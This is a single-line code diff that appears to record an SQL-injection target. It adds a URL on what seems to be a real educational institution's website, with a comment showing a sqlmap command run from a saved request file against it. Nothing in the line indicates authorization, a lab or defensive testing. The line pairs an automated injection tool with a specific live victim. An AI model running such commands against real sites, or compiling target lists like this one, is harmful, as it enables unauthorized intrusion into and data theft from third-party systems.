@@ -1,0 +1,1 @@
+http://www.hcc.edu.bd:80/?page_id=100 (GET)  # .\sqlmap.py -r .\postReqs\hcc
